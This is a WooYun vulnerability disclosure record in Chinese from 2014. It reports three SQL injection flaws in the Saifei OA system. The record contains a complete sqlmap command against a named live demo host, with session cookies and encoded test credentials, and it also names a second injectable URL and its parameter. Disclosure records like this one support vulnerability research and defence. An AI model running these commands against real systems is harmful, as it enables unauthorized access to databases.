{"id": 51036, "wybug_id": "wooyun-2014-075953", "wybug_title": "赛飞OA系统前台注入三枚", "wybug_corp": "赛飞软件", "wybug_author": "D_in", "wybug_date": "2014-09-15 17:02", "wybug_open_date": "2014-12-14 17:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向公众公开  简要描述： 赛飞OA系统注入，需登录，影响很大，官网版本为5+已经注入成功，求大厂商 详细说明：  官网：http://www.slssoft.com/百度百科：http://baike.baidu.com/view/5222614.htm?fr=aladdin官网demo：http://oa.isoffice.cn/客户众多：http://www.slssoft.com/Web/Index/WebDetail/customer第一处注入点搜索型的sql注入注入点在个人信息搜索处\n\n数据库版本\n\n上sqlmap注入语句：sqlmap -u \"http://oa.isoffice.cn/StudyInfo/PersionInfoList.aspx\" --data \"__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUKMTg1MjkyNjMzMQ8WBB4IU29ydEluZm8FCEVkaXRUaW1lHghTb3J0RGVzYwUEZGVzYxYCZg9kFhRmDxBkZBYBZmQCAQ8PZBYCHglvbmtleWRvd24FHlN1Ym1pdEtleUNsaWNrKCdJbWdCdXRRdWVyeScpO2QCAw88KwALAgAPFgoeCFBhZ2VTaXplAgoeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGYWBB4Ib2xkVmFsdWUFByNmMGYwZjAeC3NpbmdsZVZhbHVlBQcjZmZmZmZmAxYEHglCYWNrQ29sb3IJxsbG%2Fx4EXyFTQgIIZAIFDw9kFgIeB29uY2xpY2sFVWphdmFzY3JpcHQ6e2lmKGNvbmZpcm0oJ%2BehruWumuWIoOmZpOaJgOaciemAieS4reS%2FoeaBr%2BWQl%2B%2B8nycpPT1mYWxzZSkgcmV0dXJuIGZhbHNlO31kAgYPD2QWAh8MBVhqYXZhc2NyaXB0OntpZihjb25maXJtKCfnoa7lrprlj5HluIPmiYDpgInkv6Hmga%2Foh7Ppl6jmiLflkJfvvJ8nKT09ZmFsc2UpIHJldHVybiBmYWxzZTt9ZAIHDxAPFgYeDURhdGFUZXh0RmllbGQFCkNvbHVtbk5hbWUeDkRhdGFWYWx1ZUZpZWxkBQJJRB4LXyFEYXRhQm91bmRnZBAVEwzlm73lpJbkvJrorq4M5Zu95YaF5Lya6K6uBUlU55WMBumAmuS%2FoQnkupLogZTnvZEG56eR5oqABuWfuumHkQbogqHnpagG5L2T6IKyBuWRqOWIigbor4TorroG5LiT6aKYBuaXtuaUvwzlhazlkYrkuK3lv4MM5Lq65paH6aOO6YeHDOWFrOWKoeWFrOW8gAblhazlkYoG5paw6Ze7EC0t5omA5pyJ5qCP55uuLS0VEwIyNQIyNAIyMwIyMgIyMQIyMAIxOAIxNwIxNQIxNAIxMwIxMgIxMQIxMAE0ATMBMgExATAUKwMTZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2RkAggPDxYCHgRUZXh0BQEwZGQCCQ8PFgIfEAUBMWRkAgoPDxYCHxAFATFkZAILD2QWBmYPD2QWAh8CBRhTdWJtaXRLZXlDbGljaygnbG5rT0snKTtkAgEPD2QWAh8MBS1yZXR1cm4gU0ZEYXRhR3JpZF9TZXRQYWdlU2l6ZSgnRGF0YUdyaWRJbmZvJylkAgIPD2QWAh8MBTByZXR1cm4gU0ZEYXRhR3JpZF9DYW5jZWxQYWdlU2l6ZSgnRGF0YUdyaWRJbmZvJylkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQtJbWdCdXRRdWVyeQ%3D%3D&DDLIsShow=0&txtStudyName=&ImgButQuery.x=28&ImgButQuery.y=14&DDLWebColumn=0&txtDataGridInfoPageSize=10\" --cookie \"ASP.NET_SessionId=gvotfi5dgouklugb44jj4mku; UserName=dGVzdA%3D%3D%26; UserPwd=c29mZmljZQ%3D%3D%26; SFOAUserCode=test; SFOAUserName=%b2%e2%ca%d4%d3%c3%bb%a7; SFOADeptName=%be%ad%c0%ed%b0%ec; SFOADeptID=1; SFOAWorker=%d7%dc%be%ad%c0%ed; SFOARoleID=81; SFOASysManager=; SFOAStyle=new; SFOAUserIkey=false; SFOAHeadColorR=198; SFOAHeadColorG=198; SFOAHeadColorB=198; SFOAMidColor=%23f0f0f0; SFOAMoveColor=%23e7e7e7; SFOAIPAddress=180.136.206.40; PageIndex=1; OrderInfo=; SFOA16Color=%23c6c6c6\" -p \"txtStudyName\" --current-user textStudyName参数存在sql注入当前用户名sa\n\n当前数据库：\n\n数据库中的表名\n\n第二处注入在另外一个搜索处\n\n在公共知识信息搜索处第三处注入注入语句：\nhttp://oa.isoffice.cn/Project/ProjectType.aspx?CName=C&Title=%CE%EF%D7%CA%C0%E0%B1%F0&TableName=MaterialInfo\n参数CName存在注入，需带上cookie当前数据库用户名\n\n当前数据库名\n\n   漏洞证明：  第一处注入\n\n数据库版本\n\n第二处注入\n\n第三处注入当前数据库用户名\n\n当前数据库名\n\n   修复方案：  过滤   版权声明：转载请注明来源 D_in@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-09-20 13:45 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}